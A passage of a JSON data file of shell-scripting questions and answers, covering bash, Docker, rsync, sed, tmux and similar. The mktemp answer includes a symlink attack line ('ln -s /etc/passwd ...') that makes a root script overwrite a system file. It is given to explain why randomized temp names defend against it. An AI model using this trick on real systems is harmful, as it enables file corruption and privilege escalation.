file exists\n    -h, --help                    Print this help\n    -v, --version                 Print script information\n\n    EXAMPLES\n    template.sh -o DEFAULT arg1 arg2\n\n    IMPLEMENTATION\n    version         template.sh (www.uxora.com) 0.0.4\n    author          Michel VONGVILAY\n    copyright       Copyright (c) http://www.uxora.com\n    license         GNU General Public License\n    script_id       12345\n\n# Display version info\n$ ./template.sh -v\n\n    IMPLEMENTATION\n    version         template.sh (www.uxora.com) 0.0.4\n    author          Michel VONGVILAY\n    copyright       Copyright (c) http://www.uxora.com\n    license         GNU General Public License\n    script_id       12345\nYou can get the full script template here: http://www.uxora.com/unix/shell-script/18-shell-script-template",
    "Reuse inherited image's CMD or ENTRYPOINT": "As mentioned in the comments, there's no built-in solution to this. From the Dockerfile, you can't see the value of the current CMD or ENTRYPOINT. Having a run-parts solution is nice if you control the upstream base image and include this code there, allowing downstream components to make their changes. But docker there's one inherent issue that will cause problems with this, containers should only run a single command that needs to run in the foreground. So if the upstream image kicks off, it would stay running without giving your later steps a chance to run, so you're left with complexities to determine the order to run commands to ensure that a single command does eventually run without exiting.\nMy personal preference is a much simpler and hardcoded option, to add my own command or entrypoint, and make the last step of my command to exec the upstream command. You will still need to manually identify the script name to call from the upstream Dockerfile. But now in your start.sh, you would have:\n#!/bin/sh\n\n# run various pieces of initialization code here\n# ...\n\n# kick off the upstream command:\nexec /upstream-entrypoint.sh \"$@\"\nBy using an exec call, you transfer pid 1 to the upstream entrypoint so that signals get handled correctly. And the trailing \"$@\" passes through any command line arguments. You can use set to adjust the value of $@ if there are some args you want to process and extract in your own start.sh script.",
    "How do I capture all of my compiler's output to a file?": "The compiler warnings happen on stderr, not stdout, which is why you don't see them when you just redirect make somewhere else. Instead, try this if you're using Bash:\n$ make &> results.txt\nThe & means \"redirect stdout and stderr to this location\". Other shells often have similar constructs.",
    "read stdin in function in bash script": "If the question is How do I pass stdin to a bash function?, then the answer is:\nShellscript functions take stdin the ordinary way, as if they were commands or programs. :)\ninput.txt:\nHELLO WORLD\nHELLO BOB\nNO MATCH\ntest.sh:\n#!/bin/sh\n\nmyfunction() {\n    grep HELLO\n}\n\ncat input.txt | myfunction\nOutput:\nhobbes@metalbaby:~/scratch$ ./test.sh \n HELLO WORLD \n HELLO BOB \nNote that command line arguments are ALSO handled in the ordinary way, like this:\ntest2.sh:\n#!/bin/sh\n\nmyfunction() {\n    grep \"$1\"\n}\n\ncat input.txt | myfunction BOB\nOutput:\nhobbes@metalbaby:~/scratch/$ ./test2.sh \n HELLO BOB ",
    "How to calculate the log of a number using bc?": "Invoke bc with the -l option (to enable the math library) like so:\n$ echo 'l(100)/l(10)' | bc -l\n2.00000000000000000000\nUse the l function which is the natural log. Take the natural log of the number you are interested in then divide it by the natural log of 10.",
    "Django runserver permanent": "another easy way to do this is to run:\n[user@host]$screen\n[user@host]$python manage.py runserver 0.0.0.0:8000\nNow press Ctrl+A and then press d to exit from this screen.\nThis creates the server in a screen and then detaches it. This way you can simply go back in and type:\n[user@host]$screen -r\nand you can take control of the server again and see whats going on.\nYou can also detach from the screen immediately:\nscreen -d -m python manage.py runserver 0.0.0.0:8000",
    "Recursive copy of a specific file type maintaining the file structure in Unix/Linux? [closed]": "rsync is useful for local file copying as well as between machines. This will do what you want:\nrsync -avm --include='*.jar' -f 'hide,! */' . /destination_dir\nThe entire directory structure from . is copied to /destination_dir, but only the .jar files are copied. The -a ensures all permissions and times on files are unchanged. The -m will omit empty directories. -v is for verbose output.\nFor a dry run add a -n, it will tell you what it would do but not actually copy anything.",
    "How to detect running app using ADB command [duplicate]": "",
    "Print the last line of a file, from the CLI": "$ awk 'END{print}' file\nOriginally answered by Ventero",
    "subprocess.Popen(): OSError: [Errno 8] Exec format error in python?": "I solved this by putting this line at the top of the called shell script:\n#!/bin/sh\nThat will guarantee that the system always uses the correct interpreter when running your script.",
    "How do I get just real time value from 'time' command?": "If you're using the Bash builtin time, set the TIMEFORMAT variable to %R:\n$ TIMEFORMAT=%R\n$ time sleep 1\n1.022",
    "Rename multiple files in shell [duplicate]": "I like mmv for this kind of thing\nmmv 'linux_*' '#1'\nBut you can also use rename. Be aware that there are commonly two rename commands with very different syntax. One is written in Perl, the other is distributed with util-linux, so I distinguish them as \"perl rename\" and \"util rename\" below.\nWith Perl rename:\nrename 's/^linux_//' linux_*.mp4\nAs cweiske correctly pointed out.\nWith util rename:\nrename linux_ '' linux_*.mp4\nHow can you tell which rename you have? Try running rename -V; if your version is util rename it will print the version number and if it is perl rename it will harmlessly report and unknown option and show usage.\nIf you don't have either rename or mmv and don't want to or can't install them you can still accomplish this with plain old shell code:\nfor file in linux_*.mp4 ; do mv \"$file\" \"${file#linux_}\" ; done\nThis syntax will work with any POSIX sh conforming to XPG4 or later, which is essentially all shells these days.",
    "nginx: use environment variables": "With NGINX Docker image\nApply envsubst on template of the configuration file at container start. envsubst is included in official NGINX docker images.\nEnvironment variable is referenced in a form $VARIABLE or ${VARIABLE}.\nnginx.conf.template:\nuser  nginx;\nworker_processes  1;\n\nerror_log  /var/log/nginx/error.log warn;\npid        /var/run/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    server {\n        listen       80;\n        location / {\n            access_log off;\n            return 200 '${MESSAGE}';\n            add_header Content-Type text/plain;\n        }\n    }\n}\nDockerfile:\nFROM nginx:1.17.8-alpine\nCOPY ./nginx.conf.template /nginx.conf.template\nCMD [\"/bin/sh\" , \"-c\" , \"envsubst < /nginx.conf.template > /etc/nginx/nginx.conf && exec nginx -g 'daemon off;'\"]\nBuild and run docker:\ndocker build -t foo .\ndocker run --rm -it --name foo -p 8080:80 -e MESSAGE=\"Hellou World\" foo\nNOTE:If config template contains dollar sign $ which should not be substituted then list all used variables as parameter of envsubst so that only those are replaced. E.g.:\nCMD [\"/bin/sh\" , \"-c\" , \"envsubst '$USER_NAME $PASSWORD $KEY' < /nginx.conf.template > /etc/nginx/nginx.conf && exec nginx -g 'daemon off;'\"]\nNginx Docker documentation for reference. Look for Using environment variables in nginx configuration.\nUsing environment variables in nginx configuration\nOut-of-the-box, nginx doesn\u2019t support environment variables inside most configuration blocks. But envsubst may be used as a workaround if you need to generate your nginx configuration dynamically before nginx starts.\nHere is an example using docker-compose.yml:\nweb:\n  image: nginx\n  volumes:\n    - ./mysite.template:/etc/nginx/conf.d/mysite.template\n  ports:\n    - \"8080:80\"\n  environment:\n    - NGINX_HOST=foobar.com\n    - NGINX_PORT=80\n  command: /bin/bash -c \"envsubst < /etc/nginx/conf.d/mysite.template > /etc/nginx/conf.d/default.conf && exec nginx -g 'daemon off;'\"\nThe mysite.template file may then contain variable references like this:\nlisten ${NGINX_PORT};",
    "UNIX, get environment variable": "You can do:\nprintenv VARIABLE_NAME",
    "How to execute shell script from LaTeX?": "I would do something like the following (partially motivated by what Roman suggested): make your LaTeX file be\n\\documentclass{article}\n\\begin{document}\n\\input{scriptoutput.tex}\n\\end{document}\nand generate the file scriptoutput.tex using\n/usr/local/bin/my-shell-script.sh > scriptoutput.tex\nYou could encode this in a makefile if you want to have it run automatically when necessary. Alternatively, you could use the TeX \\write18 command,\n\\documentclass{article}\n\\immediate\\write18{/usr/local/bin/my-shell-script.sh > scriptoutput.tex}\n\\begin{document}\n\\input{scriptoutput.tex}\n\\end{document}\nand I think that would automatically run the shell script each time you compile the document. The \\immediate is necessary to ensure that the script is run when LaTeX encounters the command, rather than waiting until a page of output is written. (See this question for more on the shipout routine.)",
    "How does the #! shebang work?": "Recommended reading:\nThe UNIX FAQ: Why do some scripts start with #! ... ?\nThe #! magic, details about the shebang/hash-bang mechanism on various Unix flavours\nWikipedia: Shebang\nThe unix kernel's program loader is responsible for doing this. When exec() is called, it asks the kernel to load the program from the file at its argument. It will then check the first 16 bits of the file to see what executable format it has. If it finds that these bits are #! it will use the rest of the first line of the file to find which program it should launch, and it provides the name of the file it was trying to launch (the script) as the last argument to the interpreter program.\nThe interpreter then runs as normal, and treats the #! as a comment line.",
    "Why does /bin/sh behave differently to /bin/bash even if one points to the other?": "bash looks at the value of $argv[0] (bash is implemented in C) to determine how it was invoked.\nIts behavior when invoked as sh is documented in the manual:\nIf Bash is invoked with the name sh, it tries to mimic the startup behavior of historical versions of sh as closely as possible, while conforming to the POSIX standard as well.\nWhen invoked as an interactive login shell, or as a non-interactive shell with the -login option, it first attempts to read and execute commands from /etc/profile and ~/.profile, in that order. The --noprofile option may be used to inhibit this behavior. When invoked as an interactive shell with the name sh, Bash looks for the variable ENV, expands its value if it is defined, and uses the expanded value as the name of a file to read and execute. Since a shell invoked as sh does not attempt to read and execute commands from any other startup files, the --rcfile option has no effect. A non-interactive shell invoked with the name sh does not attempt to read any other startup files.\nWhen invoked as sh, Bash enters POSIX mode after the startup files are read\nThere's a long list (currently 46 items) of things that change when bash is in POSIX mode, documented here.\n(POSIX mode is probably useful mostly as a way to test scripts for portability to non-bash shells.)\nIncidentally, programs that change their behavior depending on the name under which they were invoked are fairly common. Some versions of grep, fgrep, and egrep are implemented as a single executable (though GNU grep doesn't do this). view is typically a symbolic link to vi or vim; invoking it as view causes to open in read-only mode. The Busybox system includes a number of individual commands that are all symlinks to the master busybox executable.",
    "When grep \"\\\\\" XXFile I got \"Trailing Backslash\"": "The difference is in how the shell treats the backslashes:\nWhen you write \"\\\\\" in double quotes, the shell interprets the backslash escape and ends up passing the string \\ to grep. Grep then sees a backslash with no following character, so it emits a \"trailing backslash\" warning. If you want to use double quotes you need to apply two levels of escaping, one for the shell and one for grep. The result: \"\\\\\\\\\".\nWhen you write '\\\\' in single quotes, the shell does not do any interpretation, which means grep receives the string \\\\ with both backslashes intact. Grep interprets this as an escaped backslash, so it searches the file for a literal backslash character.\nIf that's not clear, we can use echo to see exactly what the shell is doing. echo doesn't do any backslash interpretation itself, so what it prints is what the shell passed to it.\n$ echo \"\\\\\"\n\\\n$ echo '\\\\'\n\\\\",
    "How do I set the value in a command shell for dotnet core": "On Windows use\nset DOTNET_CLI_TELEMETRY_OPTOUT=1\nto avoid that telemetry data is sent by dotnet.exe in the current command line session.\nOr use\nsetx DOTNET_CLI_TELEMETRY_OPTOUT 1\ndo disable this feature permanently.",
    "Remove non-ASCII characters from a file in place in Unix shell": "A perl oneliner would do: perl -i.bak -pe 's/[^[:ascii:]]//g' <your file>\n-i says that the file is going to be edited inplace, and the backup is going to be saved with extension .bak.",
    "Time condition loop in shell": "The best way to do this is using the $SECONDS variable, which has a count of the time that the script (or shell) has been running for. The below sample shows how to run a while loop for 3 seconds.\n#! /bin/bash\nend=$((SECONDS+3))\n\nwhile [ $SECONDS -lt $end ]; do\n    # Do what you want.\n    :\ndone",
    "documenting shell scripts' parameters": "Traditionally you document your arguments in the usage() function:\n#!/bin/bash\n\nprogramname=$0\n\nfunction usage {\n    echo \"usage: $programname [-abch] [-f infile] [-o outfile]\"\n    echo \"  -a      turn on feature a\"\n    echo \"  -b      turn on feature b\"\n    echo \"  -c      turn on feature c\"\n    echo \"  -h      display help\"\n    echo \"  -f infile   specify input file infile\"\n    echo \"  -o outfile  specify output file outfile\"\n    exit 1\n}\n\nusage",
    "getting error /usr/bin/env: sh: No such file or directory when running command play": "This error usually happens if the script has windows line endings instead of unix line endings.\nTry running dos2unix on the script and try running your command again to see if you get the same error.\ndos2unix [filename]",
    "Subtract 1 hour from date in UNIX shell script": "The following command works on recent versions of GNU date:\ndate -d '1 hour ago' \"+%m/%d/%Y -%H:%M:%S\"",
    "Bash: wait with timeout": "Both your example and the accepted answer are overly complicated, why do you not only use timeout since that is exactly its use case? The timeout command even has an inbuilt option (-k) to send SIGKILL after sending the initial signal to terminate the command (SIGTERM by default) if the command is still running after sending the initial signal (see man timeout).\nIf the script doesn't necessarily require to wait and resume control flow after waiting it's simply a matter of\ntimeout -k 60s 60s app1 &\ntimeout -k 60s 60s app2 &\n# [...]\nIf it does, however, that's just as easy by saving the timeout PIDs instead:\npids=()\ntimeout -k 60s 60s app1 &\npids+=($!)\ntimeout -k 60s 60s app2 &\npids+=($!)\nwait \"${pids[@]}\"\n# [...]\nE.g.\n$ cat t.sh\n#!/bin/bash\n\necho \"$(date +%H:%M:%S): start\"\npids=()\ntimeout 10 bash -c 'sleep 5; echo \"$(date +%H:%M:%S): job 1 terminated successfully\"' &\npids+=($!)\ntimeout 2 bash -c 'sleep 5; echo \"$(date +%H:%M:%S): job 2 terminated successfully\"' &\npids+=($!)\nwait \"${pids[@]}\"\necho \"$(date +%H:%M:%S): done waiting. both jobs terminated on their own or via timeout; resuming script\"\n.\n$ ./t.sh\n08:59:42: start\n08:59:47: job 1 terminated successfully\n08:59:47: done waiting. both jobs terminated on their own or via timeout; resuming script",
    "How to convert string to integer in UNIX shelll": "The standard solution:\n expr $d1 - $d2\nYou can also do:\necho $(( d1 - d2 ))\nbut beware that this will treat 07 as an octal number! (so 07 is the same as 7, but 010 is different than 10).",
    "Using if elif fi in shell scripts [duplicate]": "Josh Lee's answer works, but you can use the \"&&\" operator for better readability like this:\necho \"You have provided the following arguments $arg1 $arg2 $arg3\"\nif [ \"$arg1\" = \"$arg2\" ] && [ \"$arg1\" != \"$arg3\" ]\nthen \n    echo \"Two of the provided args are equal.\"\n    exit 3\nelif [ $arg1 = $arg2 ] && [ $arg1 = $arg3 ]\nthen\n    echo \"All of the specified args are equal\"\n    exit 0\nelse\n    echo \"All of the specified args are different\"\n    exit 4 \nfi",
    "Dotenv multiline variables": "According to the documentation\nMulti-line values\nIf you need multiline variables, for example private keys, you can double quote strings and use the \\n character for newlines:\nPRIVATE_KEY=\"-----BEGIN RSA PRIVATE KEY-----\\nHkVN9\u2026\\n-----END DSA PRIVATE KEY-----\\n\"",
    "What are the differences of system(), exec() and shell_exec() in PHP?": "",
    "How to write a bash script to set global environment variable?": "Just run your shell script preceded by \".\" (dot space).\nThis causes the script to run the instructions in the original shell. Thus the variables still exist after the script finish\nEx:\ncat setmyvar.sh\nexport myvar=exists\n\n. ./setmyvar.sh\n\necho $myvar\nexists",
    "List file using ls command in Linux with full path [duplicate]": "You can use\n  ls -lrt -d -1 \"$PWD\"/{*,.*}   \nIt will also catch hidden files.",
    "Waiting for background processes to finish before exiting script": "If you want to wait for jobs to finish, use wait. This will make the shell wait until all background jobs complete. However, if any of your jobs daemonize themselves, they are no longer children of the shell and wait will have no effect (as far as the shell is concerned, the child is already done. Indeed, when a process daemonizes itself, it does so by terminating and spawning a new process that inherits its role).\n#!/bin/sh\n{ sleep 5; echo waking up after 5 seconds; } &\n{ sleep 1; echo waking up after 1 second; } &\nwait\necho all jobs are done!",
    "How to fix ctrl+c inside a docker container": "The problem is that Ctrl-C sends a signal to the top-level process inside the container, but that process doesn't necessarily react as you would expect. The top-level process has ID 1 inside the container, which means that it doesn't get the default signal handlers that processes usually have. If the top-level process is a shell, then it can receive the signal through its own handler, but doesn't forward it to the command that is executed within the shell. Details are explained here. In both cases, the docker container acts as if it simply ignores Ctrl-C.\nStarting with docker 0.6.5, you can add -t to the docker run command, which will attach a pseudo-TTY. Then you can type Control-C to detach from the container without terminating it.\nIf you use -t and -i then Control-C will terminate the container. When using -i with -t then you have to use Control-P Control-Q to detach without terminating.\nTest 1:\n$ ID=$(sudo docker run -t -d ubuntu /usr/bin/top -b)\n$ sudo docker attach $ID\nControl-P Control-Q\n$ sudo docker ps\nThe container is still listed.\nTest 2:\n$ ID=$(sudo docker run -t -i -d ubuntu /usr/bin/top -b)\n$ sudo docker attach $ID\nControl-C\n$ sudo docker ps\nthe container is not there (it has been terminated). If you type Control-P Control-Q instead of Control-C in the 2nd example, the container would still be running.\nWrap the program with a docker-entrypoint.sh bash script that blocks the container process and is able to catch ctrl-c. This bash example might help: https://rimuhosting.com/knowledgebase/linux/misc/trapping-ctrl-c-in-bash\n#!/bin/bash\n\n# trap ctrl-c and call ctrl_c()\ntrap ctrl_c INT\n\nfunction ctrl_c() {\n        echo \"** Trapped CTRL-C\"\n}\n\nfor i in `seq 1 5`; do\n    sleep 1\n    echo -n \".\"\ndone",
    "Shell script: Run function from script over ssh": "You can use the typeset command to make your functions available on a remote machine via ssh. There are several options depending on how you want to run your remote script.\n#!/bin/bash\n# Define your function\nmyfn () {  ls -l; }\nTo use the function on the remote hosts:\ntypeset -f myfn | ssh user@host \"$(cat); myfn\"\ntypeset -f myfn | ssh user@host2 \"$(cat); myfn\"\nBetter yet, why bother with pipe:\nssh user@host \"$(typeset -f myfn); myfn\"\nOr you can use a HEREDOC:\nssh user@host << EOF\n    $(typeset -f myfn)\n    myfn\nEOF\nIf you want to send all the functions defined within the script, not just myfn, just use typeset -f like so:\nssh user@host \"$(typeset -f); myfn\"\nExplanation\ntypeset -f myfn will display the definition of myfn.\ncat will receive the definition of the function as a text and $() will execute it in the current shell which will become a defined function in the remote shell. Finally the function can be executed.\nThe last code will put the definition of the functions inline before ssh execution.",
    "Creating temp files in scripts: Advantages of mktemp over touch-ing a file? [closed]": "mktemp randomizes the name. It is very important from the security point of view.\nJust imagine that you do something like:\necho something > /tmp/temporary-file\nin your root-running script.\nAnd someone (who has read your script) does\nln -s /etc/passwd /tmp/temporary-file\nbefore.\nThis results in /etc/passwd being overwritten, and potentially it can mean different unpleasant things starting from the system becomes broken, and ending with the system becomes hacked (when the input something could be carefully crafted).\nThe mktemp command could help you in this situation:\nTEMP=$(mktemp /tmp/temporary-file.XXXXXXXX)\necho something > ${TEMP}\nNow this ln /etc/passwd attack will not work.\nA brief insight into the history of mktemp: The mktemp command was invented by the OpenBSD folks, and first appeared in OpenBSD 2.1 back in 1997. Their goal was to improve the security of shell scripts. Previously the norm had been to add $$ to temporary file names, which was absolutely insecure. Now all UNIX/Linux systems have either mktemp or its alternatives, and it became standard de-facto. Funny enough, the mktemp C function was deprecated for being unsecure.",
    "My fish is blind? (fish does not recognise any commands after setting it as default shell on Mac OS Big Sur, M1 Mac)": "Here are the steps I used to setup the fish shell on my M1 MacBook Air. Per the comments on the question, the key to solving the Unknown Command issue is the fish_add_path:\n$ brew install fish \n$ fish\n$ fish_add_path /opt/homebrew/bin\n$ echo \"/opt/homebrew/bin/fish\" | sudo tee -a /etc/shells\n$ chsh -s /opt/homebrew/bin/fish",
    "command not found when using sudo ulimit [closed]": "ulimit is a shell builtin like cd, not a separate program. sudo looks for a binary to run, but there is no ulimit binary, which is why you get the error message.\nYou have a few options:\nOn newer linux versions, there is usually a prlimit command which is a binary, meaning you can sudo it if needed.\nRun\nprlimit --pid=$$ --nofile=65000:\nto increase the soft limit for the current shell. $$ is magic that gets interpreted as, \u201cthe process id of the current shell.\u201d\nIf that command complains about \u201cOperation not permitted,\u201d sudo prlimit will work in most cases.\nsudo prlimit --pid=$$ --nofile=65000\nIf you still get \u201cOperation not permitted\u201d with sudo, you might be running into some other kernel limit, like exceeding the max allowable limit.\nYou used to be able to rely on running\nsudo sh -c \"ulimit -n 65535 && exec su $LOGNAME\"\nand that may still work on older linux installs. It will give you a new shell, without root privileges, but with the raised limit. The exec causes the new shell to replace the process with sudo privileges, so after you exit that shell, you won\u2019t accidentally end up as root again.\nHowever this doesn\u2019t seem to work reliably on newer (2022+?) distros, where su re-applies the default limits.\nThe prlimit approach is much better though as you don\u2019t have the security concern of running a root shell, or a process that was forked from a root shell. If you are desperate a risky variant that seems to work on newer distros is the monstrosity sudo -E sh -c \"ulimit -n 65000 && exec setpriv --reuid=$(id -u) --regid=$(id -g) --inh-caps=-all --groups=$(groups|tr ' ' ,) -- env USER=\\\"$USER\\\" LOGNAME=\\\"$LOGNAME\\\" \\\"$SHELL\\\" --login\".\nHowever option #1 is far simpler, much less risky from a security perspective, and you should definitely use it if available.",
    "What does \"< <(command args)\" mean in the shell?": "<() is called process substitution in the manual, and is similar to a pipe but passes an argument of the form /dev/fd/63 instead of using stdin.\n< reads the input from a file named on command line.\nTogether, these two operators function exactly like a pipe, so it could be rewritten as\nfind /bar -name *foo* -print0 | while read line; do\n  ...\ndone",
    "Install ONLY mongo shell, not mongodb": "Official documentation says that you should be fine installing mongodb-org-shell only.",
    "Removing part of a filename for multiple files on Linux": "First of all use 'sed -e' instead of '\\e'\nAnd I would suggest you do it this way in bash\nfor filename in *.fasta; do \n    [ -f \"$filename\" ] || continue\n    mv \"$filename\" \"${filename//test.extra/}\"\n\ndone",
    "Using jq to fetch key value from json output": "You need to combine filters by means of | operator:\n$ jq -r '.[] | .[] | .name' test.json \nrhel6.6\nrhel7\nThe first .[] fetches repositories array. The next .[] fetches all the items of the repositories array. Finally, .name extracts properties from the array items(objects).\nNote, the first .[] works on object because it is a documented feature:\n.[]\n    If you use the .[index] syntax, but omit the index entirely, it\n    will return all of the elements of an array...\n\n    You can also use this on an object, and it will return all the\n    values of the object.",
    "How to run a bash script from C++ program": "Use the system function.\nsystem(\"myfile.sh\"); // myfile.sh should be chmod +x",
    "bash how to search for a string in all files in given directory using grep command [duplicate]": "Just use\ngrep -R <stringToSearch> <dirName>\ne.g to search \"text\" in current directory and all the files inside\ngrep -R \"text\" .\nIf you want to get number of occurrences use wc -l as pipe\ngrep -R \"text\" . | wc -l",
    "Get the name of the caller script in bash script": "Based on @user3100381's answer, here's a much simpler command to get the same thing which I believe should be fairly portable:\nPARENT_COMMAND=$(ps -o comm= $PPID)\nReplace comm= with args= to get the full command line (command + arguments). The = alone is used to suppress the headers.\nSee: http://pubs.opengroup.org/onlinepubs/009604499/utilities/ps.html",
    "Copy/Paste in emacs ansi-term shell": "You may want to simply switch between character mode and line mode while using the terminal. C-c C-j will run term-line-mode, which treats the terminal buffer more like a normal text-buffer in which you can move the cursor and yank text. You can switch back to character mode by running term-char-mode with C-c C-k.",
    "Get last line of shell output as a variable": "Put the tail inside the capturing parens.\nOUTPUT=$(exif ... | tail -1)\nYou don't need the double quotes here. I'm guessing that you tried\nOUTPUT=\"$(exif ...) | tail -1\"",
    "Rename Directory Name Before tar Happens": "Which tar?\nGNU Tar accepts a --transform argument, to which you give a sed expression to manipulate filenames.\nFor example, to rename during unpacking:\ntar -zxf my-dir.tar.gz --transform s/my-dir/your-dir/\nBSD tar and S tar similarly have an -s argument, taking a simple /old/new/ (not a general sed expression).",
    "Use grep to find content in files and move them if they match": "If you want to find and move files that do not match your pattern (move files that don't contain 'Subject \\[SPAM\\]' in this example) use:\ngrep -L -Z -r 'Subject: \\[SPAM\\]' . | xargs -0 -I{} mv {} DIR\nThe -Z means output with zeros (\\0) after the filenames (so spaces are not used as delimeters).\nxargs -0\nmeans interpret \\0 to be delimiters.\nThe -L means find files that do not match the pattern. Replace -L with -l if you want to move files that match your pattern.\nThen\n-I{} mv {} DIR\nmeans replace {} with the filenames, so you get mv filenames DIR.",
    "How do I limit (or truncate) text file by number of lines?": "In-place truncation\nTo truncate the file in-place with sed, you can do the following:\nsed -i '50001,$ d' filename\n-i means in place.\nd means delete.\n50001,$ means the lines from 50001 to the end.\nYou can make a backup of the file by adding an extension argument to -i, for example, .backup or .bak:\nsed -i.backup '50001,$ d' filename\nIn OS-X or FreeBSD you must provide an argument to -i - so to do this while avoiding making a backup:\nsed -i '' '50001,$ d' filename\nThe long argument name version is as follows, with and without the backup argument:\nsed --in-place '50001,$ d' filename\nsed --in-place=.backup '50001,$ d' filename\nNew File\nTo create a new truncated file, just redirect from head to the new file:\nhead -n50000 oldfilename > newfilename\n-n50000 means the number of lines, head otherwise defaults to 10.\n> means to redirect into, overwriting anything else that might be there.\nSubstitute >> for > if you mean to append into the new file.\nIt is unfortunate that you cannot redirect into the same file, which is why sed is recommended for in-place truncation.\nNo sed? Try Python!\nThis is a bit more typing than sed. Sed is short for \"Stream Editor\" after all, and that's another reason to use it, it's what the tool is suited for.\nThis was tested on Linux and Windows with Python 3:\nfrom collections import deque\nfrom itertools import islice\n\ndef truncate(filename, lines):\n    with open(filename, 'r+') as f:\n        blackhole = deque((),0).extend\n        file_iterator = iter(f.readline, '')\n        blackhole(islice(file_iterator, lines))\n        f.truncate(f.tell())\nTo explain the Python:\nThe blackhole works like /dev/null. It's a bound extend method on a deque with maxlen=0, which is the fastest way to exhaust an iterator in Python (that I'm aware of).\nWe can't simply loop over the file object because the tell method would be blocked, so we need the iter(f.readline, '') trick.\nThis function demonstrates the context manager, but it's a bit superfluous since Python would close the file on exiting the function. Usage is simply:\n>>> truncate('filename', 50000)",
    "Is there a way to make bash job control quiet?": "You can use parentheses to run a background command in a subshell, and that will silence the job control messages. For example:\n(sleep 10 & )",
    "Better windows command line shells [closed]": "Enable QuickEdit mode, under the Options tab of your shortcut to the command shell. Mark with the mouse, right-click to copy, right-click again to paste.\nWhile you're there, enable a hotkey (like CTRL + ALT + C) for lightning fast access to the shell.\nAnd no, you can't have CTRL + C for COPY, because CTRL + C means BREAK.\nOn a related note, the Microsoftee who changed the default setting of QuickEdit mode between Windows Server 2000 and 2003 is an idiot and I heap curses upon him each workday.",
    "Fish equivalent of bash $(command) notation": "In fish, $ is used only for variables. Correct notation equivalent to bash $(command) is just (command) in fish.",
    "How to run a script at the start up of Ubuntu? [closed]": "First of all, the easiest way to run things at startup is to add them to the file /etc/rc.local.\nAnother simple way is to use @reboot in your crontab. Read the cron manpage for details.\nHowever, if you want to do things properly, in addition to adding a script to /etc/init.d you need to tell ubuntu when the script should be run and with what parameters. This is done with the command update-rc.d which creates a symlink from some of the /etc/rc* directories to your script. So, you'd need to do something like:\nupdate-rc.d yourscriptname start 2\nHowever, real init scripts should be able to handle a variety of command line options and otherwise integrate to the startup process. The file /etc/init.d/README has some details and further pointers.",
    "How to store directory files listing into an array?": "I'd use\nfiles=(*)\nAnd then if you need data about the file, such as size, use the stat command on each file.",
    "Ruby run shell command in a specific directory": "You can use the block-version of Dir.chdir. Inside the block you are in the requested directory, after the Block you are still in the previous directory:\nDir.chdir('mydir'){\n  %x[#{cmd}]\n}",
    "Get ceiling integer from number in linux (BASH)": "Why use external script languages? You get floor by default. To get ceil, do\n$ divide=8; by=3; (( result=(divide+by-1)/by )); echo $result\n3\n$ divide=9; by=3; (( result=(divide+by-1)/by )); echo $result\n3\n$ divide=10; by=3; (( result=(divide+by-1)/by )); echo $result\n4\n$ divide=11; by=3; (( result=(divide+by-1)/by )); echo $result\n4\n$ divide=12; by=3; (( result=(divide+by-1)/by )); echo $result\n4\n$ divide=13; by=3; (( result=(divide+by-1)/by )); echo $result\n5\n....\nTo take negative numbers into account you can beef it up a bit. Probably cleaner ways out there but for starters\n$ divide=-10; by=10; neg=; if [ $divide -lt 0 ]; then (( divide=-divide )); neg=1; fi; (( result=(divide+by-1)/by )); if [ $neg ]; then (( result=-result )); fi; echo $result\n-1\n\n$ divide=10; by=10; neg=; if [ $divide -lt 0 ]; then (( divide=-divide )); neg=1; fi; (( result=(divide+by-1)/by )); if [ $neg ]; then (( result=-result )); fi; echo $result\n1\n(Edited to switch let ... to (( ... )).)",
    "How to write if statement in .tmux.conf to set different options for different tmux versions?": "Based on @ericx's answer and @thiagowfx's answer I put the following together which covers many of the listed incompatibilties from version 2.0 onwards:\n# Version-specific commands [grumble, grumble]\n# See: https://github.com/tmux/tmux/blob/master/CHANGES\nrun-shell 'tmux setenv -g TMUX_VERSION $(tmux -V | \\\n                           sed -En \"s/^tmux[^0-9]*([.0-9]+).*/\\1/p\")'\n\nif-shell -b '[ \"$(echo \"$TMUX_VERSION < 2.1\" | bc)\" = 1 ]' {\n    set -g mouse-select-pane on; set -g mode-mouse on\n    set -g mouse-resize-pane on; set -g mouse-select-window on\n    set -g message-fg red\n    set -g message-bg black\n    set -g message-attr bright\n    set -g window-status-bg default\n    set -g window-status-fg default\n    set -g window-status-current-attr bold\n    set -g window-status-current-bg cyan\n    set -g window-status-current-fg default\n    set -g window-status-bell-fg red\n    set -g window-status-bell-bg black\n    set -g window-status-activity-fg white\n    set -g window-status-activity-bg black\n}\n\n# In version 2.1 \"mouse\" replaced the previous 4 mouse options\nif-shell -b '[ \"$(echo \"$TMUX_VERSION >= 2.1\" | bc)\" = 1 ]' {\n    set -g mouse on\n}\n\n# UTF8 is autodetected in 2.2 onwards, but errors if explicitly set\nif-shell -b '[ \"$(echo \"$TMUX_VERSION < 2.2\" | bc)\" = 1 ]' \\\n    set -g utf8 on\n    set -g status-utf8 on\n    set -g mouse-utf8 on\n}\n\n# bind-key syntax changed in 2.4 -- selection / copy / paste\nif-shell -b '[ \"$(echo \"$TMUX_VERSION < 2.4\" | bc)\" = 1 ]' {\n    bind-key -t vi-copy v   begin-selection\n    bind-key -t vi-copy V   send -X select-line\n    bind-key -t vi-copy C-v rectangle-toggle\n    bind-key -t vi-copy y   copy-pipe 'xclip -selection clipboard -in'\n}\n\n# Newer versions\nif-shell -b '[ \"$(echo \"$TMUX_VERSION < 2.9\" | bc)\" = 1 ]' {\n    bind-key -T copy-mode-vi v   send -X begin-selection\n    bind-key -T copy-mode-vi V   send -X select-line\n    bind-key -T copy-mode-vi C-v send -X rectangle-toggle\n    bind-key -T copy-mode-vi y   send -X copy-pipe-and-cancel 'xclip -selection clipboard -in'\n}\n\nif-shell -b '[ \"$(echo \"$TMUX_VERSION >= 2.9\" | bc)\" = 1 ]' {\n    set -g message-style fg=red,bg=black\n    set -g message-style bright\n    set -g window-status-style          fg=default,bg=default\n    set -g window-status-current-style  fg=default,bg=cyan,bold\n    set -g window-status-bell-style     fg=red,bg=black\n    set -g window-status-activity-style fg=white,bg=black\n}\nI raised an issue about the problems with tmux's non-backward-compatibility here. The summary is that the tmux devs will not support backward compatibility, nor will they adopt a version numbering scheme which highlights which versions contain breaking changes. \ud83d\ude22\nI raised an issue to support numeric comparators for %if which was implemented in v3.0.",
